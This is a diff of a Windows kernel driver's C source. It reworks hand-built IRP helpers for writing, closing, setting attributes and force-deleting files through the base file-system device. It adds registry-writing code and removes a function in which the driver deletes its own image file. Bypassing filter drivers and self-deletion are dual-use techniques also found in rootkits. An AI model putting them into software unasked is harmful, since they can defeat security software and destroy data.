+        return STATUS_INSUFFICIENT_RESOURCES;;
+    }
+
+    MmBuildMdlForNonPagedPool(irp->MdlAddress);
+    //éè??±?á?
+    irp->Flags = IRP_SYNCHRONOUS_API | IRP_WRITE_OPERATION;          //IRPD′2ù×÷
+    irp->RequestorMode = KernelMode;
+    irp->UserIosb = pIoStatusBlock;
+    irp->UserEvent = &event;
+    irp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
+    irp->Tail.Overlay.OriginalFileObject = pFileObject;
+    irpSp = IoGetNextIrpStackLocation(irp);
+    irpSp->MajorFunction = IRP_MJ_WRITE;
+    irpSp->MinorFunction = IRP_MN_NORMAL;
+    irpSp->DeviceObject = deviceObject;
+    irpSp->FileObject = pFileObject;
+    irpSp->Parameters.Write.Length = aalen;
+    irpSp->Parameters.Write.ByteOffset = *ByteOffset;
+    KeInitializeEvent(&event, SynchronizationEvent, FALSE);
+    IoSetCompletionRoutine(irp, IoCompletionRoutineEx, NULL, TRUE, TRUE, TRUE);
+    polddev = IoGetBaseFileSystemDeviceObject(pFileObject);
+    status = IoCallDriver(polddev, irp);
+
+    if(status == STATUS_PENDING)
+        status = KeWaitForSingleObject(&event, Executive, KernelMode, TRUE, NULL);
+
+    status = pIoStatusBlock->Status;
+#ifdef DBG
+    LOG(LOGFL_INFO, ("[IrpFileWrite] write file len:%d  file status:%x\n", pIoStatusBlock->Information, pIoStatusBlock->Status));
+#endif
+    return status;
+}
+
 NTSTATUS GetDriveObject(PUNICODE_STRING pDriveName, PDEVICE_OBJECT * DeviceObject, PDEVICE_OBJECT * ReadDevice)
 {
 
@@ -2598,11 +2908,12 @@ NTSTATUS GetDriveObject(PUNICODE_STRING pDriveName, PDEVICE_OBJECT * DeviceObjec
     PFILE_OBJECT pFileObject;
 
     if(pDriveName == NULL || DeviceObject == NULL || ReadDevice == NULL)return STATUS_INVALID_PARAMETER;
+    //  \\??\\C:
     InitializeObjectAttributes(&objectAttributes, pDriveName, OBJ_CASE_INSENSITIVE, NULL, NULL);
     status = IoCreateFile(&DeviceHandle, SYNCHRONIZE | FILE_ANY_ACCESS, &objectAttributes, &ioStatus, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT | FILE_DIRECTORY_FILE, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING);
 
     if(!NT_SUCCESS(status)) {
-        DbgPrint("[GetDriveObject] call IoCreateFile ntStatus:%x  pDriveName??%wZ", status, pDriveName);
+        DbgPrint("[GetDriveObject] call IoCreateFile ntStatus:%x  pDriveName￡o%wZ", status, pDriveName);
         return status;
     }
     status = ObReferenceObjectByHandle(DeviceHandle, FILE_READ_DATA, *IoFileObjectType, KernelMode, (PVOID*)&pFileObject, NULL);
@@ -2627,6 +2938,100 @@ NTSTATUS GetDriveObject(PUNICODE_STRING pDriveName, PDEVICE_OBJECT * DeviceObjec
 }
 
 
+NTSTATUS IrpClose(PFILE_OBJECT  pFileObject)
+{
+    //
+    PDEVICE_OBJECT DeviceObject;
+    NTSTATUS ntStatus;
+    IO_STATUS_BLOCK  IoStatusBlock;
+    PIRP pIrp;
+    KEVENT kEvent;
+    PIO_STACK_LOCATION IrpSp;
+
+    if(pFileObject == NULL)return STATUS_INVALID_PARAMETER;
+
+    //DeviceObject = IoGetRelatedDeviceObject(pFileObject);
+
+    DeviceObject = IoGetBaseFileSystemDeviceObject(pFileObject);
+
+    if(DeviceObject == NULL || DeviceObject->StackSize <= 0)return STATUS_UNSUCCESSFUL;
+
+    //
+    pIrp = IoAllocateIrp(DeviceObject->StackSize, FALSE);
+
+    if(pIrp == NULL)return STATUS_INSUFFICIENT_RESOURCES;
+
+    KeInitializeEvent(&kEvent, SynchronizationEvent, FALSE);
+    pIrp->UserEvent = &kEvent;
+    pIrp->UserIosb = &IoStatusBlock;
+    pIrp->RequestorMode = KernelMode;
+    pIrp->Flags = IRP_CLOSE_OPERATION | IRP_SYNCHRONOUS_API;
+    pIrp->Tail.Overlay.Thread = PsGetCurrentThread();
+    pIrp->Tail.Overlay.OriginalFileObject = pFileObject;
+    IrpSp = IoGetNextIrpStackLocation(pIrp);
+    IrpSp->MajorFunction = IRP_MJ_CLEANUP;
+    IrpSp->FileObject = pFileObject;
+    ntStatus = IoCallDriver(DeviceObject, pIrp);
+
+    if(ntStatus == STATUS_PENDING)
+        KeWaitForSingleObject(&kEvent, Executive, KernelMode, FALSE, NULL);
+
+    ntStatus = IoStatusBlock.Status;
+
+    if(!NT_SUCCESS(ntStatus)) {
+        IoFreeIrp(pIrp);
+        return ntStatus;
+    }
+
+    KeClearEvent(&kEvent);
+    IoReuseIrp(pIrp, STATUS_SUCCESS);
+    pIrp->UserEvent = &kEvent;
+    pIrp->UserIosb = &IoStatusBlock;
+    pIrp->Tail.Overlay.OriginalFileObject = pFileObject;
+    pIrp->Tail.Overlay.Thread = PsGetCurrentThread();
+    pIrp->AssociatedIrp.SystemBuffer = (PVOID)NULL;
+    pIrp->Flags = IRP_CLOSE_OPERATION | IRP_SYNCHRONOUS_API;
+    IrpSp = IoGetNextIrpStackLocation(pIrp);
+    IrpSp->MajorFunction = IRP_MJ_CLOSE;
+    IrpSp->FileObject = pFileObject;
+
+    if(pFileObject->Vpb && !(pFileObject->Flags & FO_DIRECT_DEVICE_OPEN)) {
+        InterlockedDecrement((volatile LONG*)&pFileObject->Vpb->ReferenceCount);
+        pFileObject->Flags |= FO_FILE_OPEN_CANCELLED;
+    }
+
+    ntStatus = IoCallDriver(DeviceObject, pIrp);
+
+    if(ntStatus == STATUS_PENDING)
+        KeWaitForSingleObject(&kEvent, Executive, KernelMode, FALSE, NULL);
+
+    IoFreeIrp(pIrp);
+    ntStatus = IoStatusBlock.Status;
+    return ntStatus;
+}
+
+
+NTSTATUS IoCompletionRoutineEx(PDEVICE_OBJECT  DeviceObject, PIRP  Irp, PVOID  Context)
+{
+    UNREFERENCED_PARAMETER(Context);
+    UNREFERENCED_PARAMETER(DeviceObject);
+    *Irp->UserIosb = Irp->IoStatus;
+
+    if(Irp->UserEvent)
+        KeSetEvent(Irp->UserEvent, IO_NO_INCREMENT, 0);
+
+    if(Irp->MdlAddress) {
+        IoFreeMdl(Irp->MdlAddress);
+        Irp->MdlAddress = NULL;
+    }
+
+    IoFreeIrp(Irp);
+    return STATUS_MORE_PROCESSING_REQUIRED;
+}
+
+
+
+
 NTSTATUS IrpCreateFile(PUNICODE_STRING pFilePath, ACCESS_MASK DesiredAccess, PIO_STATUS_BLOCK pIoStatusBlock, PFILE_OBJECT * pFileObject)
 {
 
@@ -2649,6 +3054,8 @@ NTSTATUS IrpCreateFile(PUNICODE_STRING pFilePath, ACCESS_MASK DesiredAccess, PIO
 
     //参数效验
     if(pFilePath == NULL || pIoStatusBlock == NULL || pFileObject == NULL || pFilePath->Length <= SYMBOLICLINKLENG)return STATUS_INVALID_PARAMETER;
+
+    //pFilePath  \\??\\c:\\456\\123.sys
     RtlZeroMemory(szFilePath, sizeof(szFilePath));
     RtlCopyMemory(szFilePath, pFilePath->Buffer, (SYMBOLICLINKLENG + 1)*sizeof(wchar_t));
     RtlInitUnicodeString(&DriveName, szFilePath); //DriveName=\\??\\c:\
@@ -2659,7 +3066,6 @@ NTSTATUS IrpCreateFile(PUNICODE_STRING pFilePath, ACCESS_MASK DesiredAccess, PIO
         DbgPrint("[IrpCreateFile] GetDriveObjectA ntStatus:%x pDeviceObject:%p pReadDevice:%p", ntStatus, pDeviceObject, pReadDevice);
         return ntStatus;
     }
-
 
     RtlZeroMemory(szFilePath, sizeof(szFilePath));
     RtlCopyMemory(szFilePath, &pFilePath->Buffer[SYMBOLICLINKLENG], pFilePath->Length - SYMBOLICLINKLENG);
@@ -2736,7 +3142,6 @@ NTSTATUS IrpCreateFile(PUNICODE_STRING pFilePath, ACCESS_MASK DesiredAccess, PIO
     IoSetCompletionRoutine(pIrp, IoCompletionRoutineEx, 0, TRUE, TRUE, TRUE);
     polddev = IoGetBaseFileSystemDeviceObject(pNewFileObject);
     ntStatus = IoCallDriver(polddev, pIrp);
-
     //     DbgPrint("polddev:%p", polddev);
     //
     if(polddev) {
@@ -2767,103 +3172,23 @@ NTSTATUS IrpCreateFile(PUNICODE_STRING pFilePath, ACCESS_MASK DesiredAccess, PIO
 }
 
 
-NTSTATUS IoCompletionRoutineEx(PDEVICE_OBJECT  DeviceObject, PIRP  Irp, PVOID  Context)
+void ZwDeleteFileFolder(WCHAR *wsFileName)
 {
-    UNREFERENCED_PARAMETER(Context);
-    UNREFERENCED_PARAMETER(DeviceObject);
-    *Irp->UserIosb = Irp->IoStatus;
+    NTSTATUS st;
+    OBJECT_ATTRIBUTES ObjectAttributes;
+    UNICODE_STRING UniFileName;
+    //
+    RtlInitUnicodeString(&UniFileName, wsFileName);
+    //
+    InitializeObjectAttributes(&ObjectAttributes,
+                               &UniFileName,
+                               OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+                               NULL,
+                               NULL);
+    st = ZwDeleteFile(&ObjectAttributes);
 
-    if(Irp->UserEvent)
-        KeSetEvent(Irp->UserEvent, IO_NO_INCREMENT, 0);
-
-    if(Irp->MdlAddress) {
-        IoFreeMdl(Irp->MdlAddress);
-        Irp->MdlAddress = NULL;
-    }
-
-    IoFreeIrp(Irp);
-    return STATUS_MORE_PROCESSING_REQUIRED;
 }
 
-
-NTSTATUS IrpClose(PFILE_OBJECT  pFileObject)
-{
-
-    PDEVICE_OBJECT DeviceObject;
-    NTSTATUS ntStatus;
-    IO_STATUS_BLOCK  IoStatusBlock;
-    PIRP pIrp;
-    KEVENT kEvent;
-    PIO_STACK_LOCATION IrpSp;
-
-    if(pFileObject == NULL)return STATUS_INVALID_PARAMETER;
-    DeviceObject = IoGetBaseFileSystemDeviceObject(pFileObject);
-    if(DeviceObject == NULL || DeviceObject->StackSize <= 0)return STATUS_UNSUCCESSFUL;
-    pIrp = IoAllocateIrp(DeviceObject->StackSize, FALSE);
-    if(pIrp == NULL)return STATUS_INSUFFICIENT_RESOURCES;
-    KeInitializeEvent(&kEvent, SynchronizationEvent, FALSE);
-    pIrp->UserEvent = &kEvent;
-    pIrp->UserIosb = &IoStatusBlock;
-    pIrp->RequestorMode = KernelMode;
-    pIrp->Flags = IRP_CLOSE_OPERATION | IRP_SYNCHRONOUS_API;
-    pIrp->Tail.Overlay.Thread = PsGetCurrentThread();
-    pIrp->Tail.Overlay.OriginalFileObject = pFileObject;
-    IrpSp = IoGetNextIrpStackLocation(pIrp);
-    IrpSp->MajorFunction = IRP_MJ_CLEANUP;
-    IrpSp->FileObject = pFileObject;
-    ntStatus = IoCallDriver(DeviceObject, pIrp);
-
-    if(ntStatus == STATUS_PENDING)
-        KeWaitForSingleObject(&kEvent, Executive, KernelMode, FALSE, NULL);
-
-    ntStatus = IoStatusBlock.Status;
-
-    if(!NT_SUCCESS(ntStatus)) {
-        IoFreeIrp(pIrp);
-        return ntStatus;
-    }
-
-    KeClearEvent(&kEvent);
-    IoReuseIrp(pIrp, STATUS_SUCCESS);
-    pIrp->UserEvent = &kEvent;
-    pIrp->UserIosb = &IoStatusBlock;
-    pIrp->Tail.Overlay.OriginalFileObject = pFileObject;
-    pIrp->Tail.Overlay.Thread = PsGetCurrentThread();
-    pIrp->AssociatedIrp.SystemBuffer = (PVOID)NULL;
-    pIrp->Flags = IRP_CLOSE_OPERATION | IRP_SYNCHRONOUS_API;
-    IrpSp = IoGetNextIrpStackLocation(pIrp);
-    IrpSp->MajorFunction = IRP_MJ_CLOSE;
-    IrpSp->FileObject = pFileObject;
-
-    if(pFileObject->Vpb && !(pFileObject->Flags & FO_DIRECT_DEVICE_OPEN)) {
-        InterlockedDecrement((volatile LONG*)&pFileObject->Vpb->ReferenceCount);
-        pFileObject->Flags |= FO_FILE_OPEN_CANCELLED;
-    }
-    ntStatus = IoCallDriver(DeviceObject, pIrp);
-    if(ntStatus == STATUS_PENDING)
-        KeWaitForSingleObject(&kEvent, Executive, KernelMode, FALSE, NULL);
-    IoFreeIrp(pIrp);
-    ntStatus = IoStatusBlock.Status;
-    return ntStatus;
-}
-
-void DeleteMyself(PDRIVER_OBJECT pDriverObj)
-{
-    PFILE_OBJECT pFileObject = NULL;
-    NTSTATUS status = -1;
-    IO_STATUS_BLOCK IoStatusBlock = {0};
-    PKLDR_DATA_TABLE_ENTRY ldrentry =      (PKLDR_DATA_TABLE_ENTRY)pDriverObj->DriverSection;
-    DbgPrint("[DeleteMyself] FullDllName:%ws", ldrentry->FullDllName.Buffer);
-    status = IrpCreateFile(&ldrentry->FullDllName, DELETE, &IoStatusBlock, &pFileObject);
-    if (NT_SUCCESS(status)) {
-        IrpDeleteFileForce(pFileObject);
-        status = IrpClose(pFileObject);
-    } else {
-        DbgPrint("[DriverEntry] call IrpCreateFile error status:%x", status);
-    }
-
-    //   ZwDeleteFileFolder(ldrentry->FullDllName.Buffer);
-}
 
 //
 NTSTATUS IrpDeleteFileForce(PFILE_OBJECT pFileObject)
@@ -2888,13 +3213,13 @@ NTSTATUS IrpDeleteFileForce(PFILE_OBJECT pFileObject)
 
     memset(&FileInformationAttribute, 0, sizeof(FILE_BASIC_INFORMATION));
     FileInformationAttribute.FileAttributes = FILE_ATTRIBUTE_NORMAL;
-    status = IrpSetFileAttributes(pFileObject, &IoStatusBlock, &FileInformationAttribute, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation, TRUE);
+    status = irpSetFileAttributes(pFileObject, &IoStatusBlock, &FileInformationAttribute, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation, TRUE);
     if (!NT_SUCCESS(status))return status;
 
 
 
-    //DeviceObject = IoGetRelatedDeviceObject(pFileObject);
-    DeviceObject = IoGetBaseFileSystemDeviceObject(pFileObject);
+    DeviceObject = IoGetRelatedDeviceObject(pFileObject);
+    // DeviceObject = IoGetBaseFileSystemDeviceObject(pFileObject);
     if (DeviceObject == NULL || DeviceObject->StackSize <= 0)return STATUS_UNSUCCESSFUL;
 
     //
@@ -2906,7 +3231,6 @@ NTSTATUS IrpDeleteFileForce(PFILE_OBJECT pFileObject)
 
     //
     FileInformationDelete.DeleteFile = TRUE;
-
 
     //
     pIrp->AssociatedIrp.SystemBuffer = &FileInformationDelete;
@@ -2962,37 +3286,32 @@ NTSTATUS IrpDeleteFileForce(PFILE_OBJECT pFileObject)
 }
 
 
-NTSTATUS IrpSetFileAttributes(PFILE_OBJECT pFileObject, PIO_STATUS_BLOCK  pIoStatusBlock, PVOID pFileInformation, ULONG FileInformationLength,
-                              FILE_INFORMATION_CLASS  FileInformationClass, BOOLEAN  ReplaceIfExists)
+NTSTATUS irpSetFileAttributes(PFILE_OBJECT pFileObject, PIO_STATUS_BLOCK  pIoStatusBlock, PVOID pFileInformation, ULONG FileInformationLength, FILE_INFORMATION_CLASS  FileInformationClass, BOOLEAN  ReplaceIfExists)
 {
 
 
     NTSTATUS                ntStatus = STATUS_SUCCESS;
     PDEVICE_OBJECT          DeviceObject;
-    PIRP                                 Irp;
-    KEVENT                           SycEvent;
+    PIRP                    Irp;
+    KEVENT                  SycEvent;
     PIO_STACK_LOCATION      irpSp;
-    if (pFileObject == NULL || pIoStatusBlock == NULL || pFileInformation == NULL || FileInformationLength <= 0)return STATUS_INVALID_PARAMETER;
 
+    if (pFileObject == NULL || pIoStatusBlock == NULL || pFileInformation == NULL || FileInformationLength <= 0)return STATUS_INVALID_PARAMETER;
     //DeviceObject = IoGetRelatedDeviceObject(pFileObject);
     DeviceObject = IoGetBaseFileSystemDeviceObject(pFileObject);
     if (DeviceObject == NULL || DeviceObject->StackSize <= 0)return STATUS_UNSUCCESSFUL;
-
     Irp = IoAllocateIrp(DeviceObject->StackSize, TRUE);
     if (Irp == NULL) {
         //ObDereferenceObject(pFileObject);
         return STATUS_UNSUCCESSFUL;
     }
-
     KeInitializeEvent(&SycEvent, SynchronizationEvent, FALSE);
-
     Irp->AssociatedIrp.SystemBuffer = pFileInformation;
     Irp->UserEvent = &SycEvent;
     Irp->UserIosb = pIoStatusBlock;
     Irp->Tail.Overlay.OriginalFileObject = pFileObject;
     Irp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
     Irp->RequestorMode = KernelMode;
-
     irpSp = IoGetNextIrpStackLocation(Irp);
     irpSp->MajorFunction = IRP_MJ_SET_INFORMATION;
     irpSp->DeviceObject = DeviceObject;
@@ -3001,7 +3320,6 @@ NTSTATUS IrpSetFileAttributes(PFILE_OBJECT pFileObject, PIO_STATUS_BLOCK  pIoSta
     irpSp->Parameters.SetFile.Length = FileInformationLength;                //长度
     irpSp->Parameters.SetFile.FileInformationClass = FileInformationClass;   //类型
     irpSp->Parameters.SetFile.FileObject = pFileObject;
-
     IoSetCompletionRoutine(Irp, IoCompletionRoutineEx, NULL, TRUE, TRUE, TRUE);
     ntStatus = IoCallDriver(DeviceObject, Irp);
     if (ntStatus == STATUS_PENDING)
@@ -3011,114 +3329,27 @@ NTSTATUS IrpSetFileAttributes(PFILE_OBJECT pFileObject, PIO_STATUS_BLOCK  pIoSta
     return ntStatus;
 
 }
-
-NTSTATUS IrpFileWrite(PFILE_OBJECT pFileObject, PLARGE_INTEGER ByteOffset, ULONG aalen, PVOID Buffer, PIO_STATUS_BLOCK pIoStatusBlock)
-{
-    NTSTATUS status;
-    KEVENT event;
-    PIRP irp;
-    PIO_STACK_LOCATION irpSp;
-    PDEVICE_OBJECT deviceObject;
-    PDEVICE_OBJECT polddev = NULL;
-
-    //
-    if(pIoStatusBlock == NULL || pFileObject == NULL || aalen <= 0 || Buffer == NULL)return STATUS_INVALID_PARAMETER;
-
-    if(ByteOffset == NULL) {
-        if(!(pFileObject->Flags & FO_SYNCHRONOUS_IO))
-            return STATUS_INVALID_PARAMETER;
-
-        ByteOffset = &pFileObject->CurrentByteOffset;
+   
+VOID SetRegKeyValue(WCHAR*        pPathKey,WCHAR* KeyName,WCHAR* strValue,ULONG uType){
+    UNICODE_STRING RegUnicodeString;
+    HANDLE hRegister;
+	UNICODE_STRING ValueName;
+	OBJECT_ATTRIBUTES objectAttributes;
+	NTSTATUS status;
+    //初始化UNICODE_STRING字符串
+    RtlInitUnicodeString( &RegUnicodeString,pPathKey);
+    //初始化objectAttributes
+    InitializeObjectAttributes(&objectAttributes,&RegUnicodeString,OBJ_CASE_INSENSITIVE,NULL, NULL );
+    //打开注册表
+    status = ZwOpenKey( &hRegister,KEY_ALL_ACCESS,&objectAttributes);
+    if (!NT_SUCCESS(status))
+    {   	
+        KdPrint("[SetRegKeyValue] Open register is not successfully ",status);
     }
-
-    deviceObject = IoGetRelatedDeviceObject(pFileObject);
-
-    if(deviceObject == NULL || deviceObject->StackSize <= 0)return STATUS_UNSUCCESSFUL;
-
-    irp = IoAllocateIrp(deviceObject->StackSize, FALSE);
-
-    if(irp == NULL)return STATUS_INSUFFICIENT_RESOURCES;
-
-    irp->MdlAddress = IoAllocateMdl(Buffer, aalen, FALSE, FALSE, NULL);
-
-    if(irp->MdlAddress == NULL) {
-        IoFreeIrp(irp);
-        return STATUS_INSUFFICIENT_RESOURCES;;
-    }
-
-    MmBuildMdlForNonPagedPool(irp->MdlAddress);
-    irp->Flags = IRP_SYNCHRONOUS_API | IRP_WRITE_OPERATION;
-    irp->RequestorMode = KernelMode;
-    irp->UserIosb = pIoStatusBlock;
-    irp->UserEvent = &event;
-    irp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
-    irp->Tail.Overlay.OriginalFileObject = pFileObject;
-    irpSp = IoGetNextIrpStackLocation(irp);
-    irpSp->MajorFunction = IRP_MJ_WRITE;
-    irpSp->MinorFunction = IRP_MN_NORMAL;
-    irpSp->DeviceObject = deviceObject;
-    irpSp->FileObject = pFileObject;
-    irpSp->Parameters.Write.Length = aalen;
-    irpSp->Parameters.Write.ByteOffset = *ByteOffset;
-    KeInitializeEvent(&event, SynchronizationEvent, FALSE);
-    IoSetCompletionRoutine(irp, IoCompletionRoutineEx, NULL, TRUE, TRUE, TRUE);
-    polddev = IoGetBaseFileSystemDeviceObject(pFileObject);
-    status = IoCallDriver(polddev, irp);
-
-    if(status == STATUS_PENDING)
-        status = KeWaitForSingleObject(&event, Executive, KernelMode, TRUE, NULL);
-
-    status = pIoStatusBlock->Status;
-#ifdef DBG
-//  MzTrace("[IrpFileWrite] write file len:%d  file status:%x\n", pIoStatusBlock->Information, pIoStatusBlock->Status);
-#endif
-    return status;
-}
-
-ULONG  GetNameOffset(PEPROCESS proobj)
-{
-    ULONG offsetName = 0;
-    PVOID ppeb =  PsGetProcessPeb(proobj);
-    if (ppeb) {
-
-        ULONG pianyi = 9;
-        ULONG i = 0;
-        ULONG j = 0;
-        for (i = 0; i < 0x500; i += 4) {
-            PUCHAR pAddr1 = (PUCHAR)proobj + i;
-            if (MmIsAddressValid(pAddr1)) {
-                ULONG_PTR  pPebVal = *(PULONG_PTR)pAddr1;
-                if (pPebVal == ppeb) {
-                    pianyi = i;
-                    break;
-                }
-            }
-        }
-
-
-
-        if (pianyi) {
-            for (j = 0; j < 0x100; j++) {
-                ULONG offset = pianyi + j;
-                PULONG_PTR pNameOffset = (PULONG_PTR)((PUCHAR)proobj + offset);
-                if (MmIsAddressValid(pNameOffset)) {
-                    ULONG_PTR pAddr2 = *pNameOffset;
-                    PUNICODE_STRING  pName = (PUNICODE_STRING)pAddr2;
-                    if (MmIsAddressValid(pName) && MmIsAddressValid(pName->Buffer)) {
-                        WCHAR *pPath = pName->Buffer;
-                        if (wcsstr(pPath, L".exe") != NULL) {
-                            LOG(LOGFL_INFO, ("[GetNameOffset] offset:%x pPath:%ws", offset, pPath));
-                            offsetName =  offset;
-                            break;
-                        }
-
-                    }
-                }
-            }
-        }
-    }
-
-    return offsetName;
+   RtlInitUnicodeString( &ValueName, KeyName);
+    //设置REG_SZ子键
+    ZwSetValueKey(hRegister,&ValueName,0,uType,strValue,wcslen(strValue)*2+2);
+    ZwClose(hRegister);
 }
 
 
